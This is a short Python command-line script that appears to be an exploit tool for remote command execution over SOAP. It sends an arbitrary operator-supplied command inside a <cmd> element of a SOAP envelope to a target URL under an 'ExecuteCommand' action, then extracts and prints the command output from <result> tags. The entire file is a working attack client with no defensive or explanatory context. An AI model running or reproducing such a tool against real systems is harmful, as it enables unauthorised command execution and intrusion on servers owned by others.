import requests
import argparse
import re

# Set up argument parsing to accept a command (cmd) argument
parser = argparse.ArgumentParser(description="Execute a command via SOAP and extract the result.")
parser.add_argument("-c", "--cmd", help="Command to execute on the target", required=True)
parser.add_argument("-u", "--url", help="Enter url of target", required=True)
args = parser.parse_args()

# Define the SOAP payload with the command as an argument
payload = f"""
<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>{args.cmd}</cmd></LoginRequest></soap:Body></soap:Envelope>
"""

# Send the SOAP request to the target URL
response = requests.post(
    args.url,
    data=payload,
    headers={"SOAPAction": '"ExecuteCommand"'}
)

# Extract and print the content between <results> tags
results = re.findall(r'<result>(.*?)</result>', response.text, re.DOTALL)

if results:
    for result in results:
        print(result.strip())
else:
    print("No results found in the response.")
